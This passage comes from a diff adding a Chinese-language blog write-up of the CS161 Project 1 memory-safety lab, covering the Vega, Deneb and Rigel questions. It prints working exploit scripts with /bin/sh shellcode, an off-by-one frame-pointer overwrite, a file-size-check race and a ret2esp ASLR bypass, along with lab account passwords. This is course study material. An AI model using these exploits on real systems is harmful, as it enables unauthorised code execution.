class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直观上这次因为要输入<code>argv</code>，所以环境变量会有所改变，相应的栈上的地址也会随着输入的不同而不同。并且在<code>flip</code>中如果<code>buf</code>已经溢出了，则 for 循环很可能执行 65 次，即会产生 one-byte-off，这可能就是突破口。<br>已知在离开函数时会执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov %ebp,%esp</span><br><span class="line">pop %ebp</span><br><span class="line">pop %eip</span><br></pre></td></tr></table></figure>
+
+<p>如果经过 one-byte-off 将<code>fsp</code>的指向了更小的地址，则会改变上述指令的效果，将<code>rip</code>指向我们的 shellcode。</p>
+<p>因为<code>./debug-exploit</code>会自动从 egg 的输出设置环境变量，所以我们让 egg 直接输出 shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line">shellcode = \</span><br><span class="line">    <span class="string">&quot;\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>然后执行<code>./debug-exploit</code>，查看一下环境变量的地址和栈上的一些地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p environ[0]</span><br><span class="line">$1 = 0xbffffc14 &quot;SHLVL=1&quot;</span><br><span class="line">(gdb) p environ[1]</span><br><span class="line">$2 = 0xbffffc1c &quot;PAD=&quot;, &#x27;\377&#x27; &lt;repeats 196 times&gt;...</span><br><span class="line">(gdb) p environ[2]</span><br><span class="line">$3 = 0xbfffff99 &quot;ENV=j2X̀\211É\301jGX̀1\300Ph//shh/binT[PS\211\341\061Ұ\v̀&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>environ[2]</code>找到了我们的 shellcode，计算出其起始地址为<code>0xbfffff99 + 0x4 = 0xbfffff9d</code>。</p>
+<p>另外：</p>
+<ol>
+<li><code>buf</code> at <code>0xbffff9f0</code></li>
+<li><code>sfp</code> at <code>0xbffffa30</code>, value <code>0xbffffa60</code></li>
+<li><code>rip</code> at <code>0xbffffa34</code></li>
+</ol>
+<p>将<code>sfp</code>的最后一个 byte 置 0，得到<code>0xbffffa00</code>为新的<code>ebp</code>地址，且有<code>0xbffff9f0 + 0x10 == 0xbffffa00</code>。新的<code>rip</code>应设置在<code>0xbffffa00 + 0x4 == 0xbffffa04</code>。记住<code>input</code>会经过<code>flip</code>，所以我们得反向处理一下 shellcode 的地址，将其每一个 byte 的第 5 位置反，得到<code>0x9fdfdfbd</code>，并且将第 65 个 byte 设置为<code>\x20</code>使<code>ebp</code>的最后一个 byte 能置为 0。其他部分就用 garbage 填充。编写的脚本如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line">last_byte = <span class="string">&#x27;\x20&#x27;</span></span><br><span class="line">rip = <span class="string">&#x27;\xbd\xdf\xdf\x9f&#x27;</span></span><br><span class="line">garbage1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">20</span></span><br><span class="line">garbage2 = <span class="string">&#x27;B&#x27;</span> * <span class="number">40</span></span><br><span class="line">payload = garbage1 + rip + garbage2 + last_byte</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>./exploit</code>，再执行<code>cat README</code>。</p>
+<h2 id="Question-5-Deneb"><a href="#Question-5-Deneb" class="headerlink" title="Question 5 Deneb"></a>Question 5 Deneb</h2><p>username: deneb<br>password: neveruseit</p>
+<p>首先看看<code>orbit.c</code>中的关键内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUFSIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">file_is_too_big</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  fstat(fd, &amp;st);</span><br><span class="line">  <span class="keyword">return</span> st.st_size &gt;= MAX_BUFSIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_file</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[MAX_BUFSIZE];</span><br><span class="line">  <span class="type">uint32_t</span> bytes_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(FILENAME, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) EXIT_WITH_ERROR(<span class="string">&quot;Could not find file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (file_is_too_big(fd)) EXIT_WITH_ERROR(<span class="string">&quot;File too big!&quot;</span>); <span class="comment">// 1. check file size</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many bytes should I read? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%u&quot;</span>, &amp;bytes_to_read) != <span class="number">1</span>) <span class="comment">// 2. input read bytes</span></span><br><span class="line">    EXIT_WITH_ERROR(<span class="string">&quot;Could not read the number of bytes to read!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> bytes_read = read(fd, buf, bytes_to_read); <span class="comment">// 3. read from file to buf</span></span><br><span class="line">  <span class="keyword">if</span> (bytes_read == <span class="number">-1</span>) EXIT_WITH_ERROR(<span class="string">&quot;Could not read!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  buf[bytes_read] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the file!\n%s&quot;</span>, buf);</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  read_file();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主体部分为<code>read_file()</code>，重要的语句已经被注释标出。在从文件读入到<code>buf</code>之前程序会检查文件的大小是否小于<code>MAX_BUFSIZE</code>，即 128。显然，如果要使<code>buf</code>overflow 必须首先通过检查文件大小这一步，而固定大小的文件无法完成这个任务。这时候 lab 提供的交互脚本就有用了。执行<code>cp interact.scaffold interact</code>得到脚本并查看其内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scaffold <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">### YOUR CODE STARTS HERE ###</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;Hello world!\n&quot;</span>)</span><br><span class="line">f.flush()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p.recv(<span class="number">30</span>) == <span class="string">&#x27;How many bytes should I read? &#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;120\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p.recv(<span class="number">18</span>) == <span class="string">&#x27;Here is the file!\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> p.recv(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### YOUR CODE ENDS HERE ###</span></span><br><span class="line"></span><br><span class="line">returncode = p.end()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> returncode == -<span class="number">11</span>: <span class="built_in">print</span> <span class="string">&#x27;segmentation fault or stack canary!&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> returncode != <span class="number">0</span>: <span class="built_in">print</span> <span class="string">&#x27;return code&#x27;</span>, returncode</span><br></pre></td></tr></table></figure>
+
+<p><code>interact</code>脚本创建了一个名为<code>hack</code>的文件并向其中写入字符串再开始与程序进行交互，由此想到我们可以在向文件写入一些数据后并不马上关闭文件，而是在与程序进行交互时再继续向文件写入数据，以此达到通过检查文件大小并 overflow<code>buf</code>的目的。而注释 2 涉及的语句也提供了交互机会。</p>
+<p>然后我们执行<code>./debug-exploit</code>，通过断点执行查看一些关键的数据。</p>
+<ol>
+<li><code>buf</code>的起始地址为<code>0xbffffa08</code></li>
+<li><code>fsp</code>在<code>0xbffffa98</code></li>
+<li><code>rip</code>在<code>0xbffffa9c</code></li>
+</ol>
+<p>假设文件中已经写入了<code>message</code>并通过了文件大小的检查，则我们把<code>SHELLCODE</code>放在<code>buf</code>+<code>len(message)</code>的位置并将这个位置写入<code>rip</code>所在位置。</p>
+<p>现在让我们完善<code>interact</code>脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### YOUR CODE STARTS HERE ###</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write message to pass file size check</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;hack&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">message = <span class="string">&quot;hello world!\n&quot;</span></span><br><span class="line">f.write(message)</span><br><span class="line">f.flush()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p.recv(<span class="number">30</span>) == <span class="string">&#x27;How many bytes should I read? &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make payload: shellcode + garbage + addr of shellcode</span></span><br><span class="line">rip = <span class="string">&quot;\x15\xfa\xff\xbf&quot;</span></span><br><span class="line">payload = SHELLCODE + <span class="string">&#x27;A&#x27;</span> * (<span class="number">148</span> - <span class="built_in">len</span>(message) - <span class="built_in">len</span>(SHELLCODE)) + rip</span><br><span class="line">f.write(payload)</span><br><span class="line">f.flush()</span><br><span class="line"></span><br><span class="line"><span class="comment"># size of message + payload</span></span><br><span class="line">p.send(<span class="string">&quot;152\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p.recv(<span class="number">18</span>) == <span class="string">&#x27;Here is the file!\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> p.recv(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### YOUR CODE ENDS HERE ###</span></span><br></pre></td></tr></table></figure>
+
+<p>直接运行<code>./interact</code>即可。</p>
+<p>当然我们也可以采取一个更谨慎的方法，正如 lab 文档所说，通过<code>tmux</code>创建另一个窗口，在其中一个窗口运行 python，对文件进行操作，另一个窗口运行<code>./debug-exploit</code>与程序交互并检查相关数据，这里就不再演示。</p>
+<h2 id="Question-6-Rigel"><a href="#Question-6-Rigel" class="headerlink" title="Question 6 Rigel"></a>Question 6 Rigel</h2><p>username: rigel<br>password: 58623</p>
+<p>此题开启了 ASLR，关于绕开 ASLR 进行攻击的方法参考<a target="_blank" rel="noopener" href="http://www.icir.org/matthias/cs161-sp13/aslr-bypass.pdf">ASLR Smack &amp; Laugh Reference” by Tilo Müller</a>中的 section 8。具体到此题使用了<strong>8.3 ret2esp</strong>的方法，但仍推荐至少阅读整个 section 以熟悉 ret2 方法的思路。</p>
+<p>由于此题并未涉及到<code>argv</code>并且<code>buf</code>的大小只有 8，故无法直接采取 ret2pop 以及 ret2eax 等方法，尝试在二进制文件中寻找<strong>jmp *%esp</strong>指令代码<code>0xff e4</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; objdump -D orbit | grep -B 2 &quot;ff e4&quot;</span><br><span class="line"> 804843d:       c1 e0 03                shl    $0x3,%eax</span><br><span class="line"> 8048440:       31 45 0c                xor    %eax,0xc(%ebp)</span><br><span class="line"> 8048443:       81 4d 08 ff e4 00 00    orl    $0xe4ff,0x8(%ebp)</span><br></pre></td></tr></table></figure>
+
+<p>有一条指令的机器码含有<code>0xff e4</code>，而且其对应的位置正好是没有使用的函数<code>magic</code>中的某条指令，计算得<code>0xff e4</code>的起始位置为<code>0x8048446</code>，我们就用其作为<code>jmp *esp</code>指令的地址。并且在<code>./debug-exploit</code>执行中可以验证其正确性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/i 0x8048446</span><br><span class="line">   0x8048446 &lt;magic+34&gt;:        jmp    *%esp</span><br></pre></td></tr></table></figure>
+
+<p>然后执行一下<code>./debug-exploit</code>记录下<code>buf</code>和<code>rip</code>的相对位置，它们的相对位置符合 Stack juggling 方法的要求不会改变。</p>
+<blockquote>
+<p>a certain stack layout, a certain program flow or certain register<br>changes. Due to the nature of these factors, they<br>might not fit to every situation. -Izik Kotler</p>
+</blockquote>
+<p>最后完善一下<code>egg</code>脚本，让<code>rip</code>指向上述的指令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line">shellcode = \</span><br><span class="line">    <span class="string">&quot;\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50&quot;</span> + \</span><br><span class="line">    <span class="string">&quot;\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="string">&quot;\x46\x84\x04\x08&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">20</span> + jmp_esp + shellcode</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>./exploit</code>，查看<code>README</code>，显示通关文字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Good work. You&#x27;ve found the blueprints for the Jupiter ships. Now the real work can begin. We must not let the innovations of space exploration be used for death and destruction. We can easily warn everyone on Earth and the Moon, but communication with the people on Mars may be a challenge...</span><br><span class="line"></span><br><span class="line">           *                            |        .</span><br><span class="line">                            .          \|/</span><br><span class="line">  +                                   --*--          `   *</span><br><span class="line">                        +              /|\            `</span><br><span class="line">     .                                / | \            `</span><br><span class="line">             .                       /  |  \            `</span><br><span class="line">             |            .             |         `      `</span><br><span class="line">   ._____.-----._                                  `      `</span><br><span class="line"> _/              \___.--.      +                    `      `</span><br><span class="line">                         \____            .          `      •</span><br><span class="line">                              -.____                  `</span><br><span class="line">[To be continued in Project 2...]   \         *        •</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CS161-Project1-writeup"><span class="toc-number">1.</span> <span class="toc-text">CS161 Project1 writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Set-up"><span class="toc-number">1.1.</span> <span class="toc-text">Set up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-1-Remus"><span class="toc-number">1.2.</span> <span class="toc-text">Question 1 Remus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-2-Spica"><span class="toc-number">1.3.</span> <span class="toc-text">Question 2 Spica</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-3-Polaris"><span class="toc-number">1.4.</span> <span class="toc-text">Question 3 Polaris</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-4-Vega"><span class="toc-number">1.5.</span> <span class="toc-text">Question 4 Vega</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-5-Deneb"><span class="toc-number">1.6.</span> <span class="toc-text">Question 5 Deneb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question-6-Rigel"><span class="toc-number">1.7.</span> <span class="toc-text">Question 6 Rigel</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/09/CS161%20Project1%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&text=CS161 Project1 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&is_video=false&description=CS161 Project1 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CS161 Project1 Writeup&body=Check out this article: http://example.com/2024/07/09/CS161%20Project1%20Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&title=CS161 Project1 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&name=CS161 Project1 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/09/CS161%20Project1%20Writeup/&t=CS161 Project1 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    molepi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
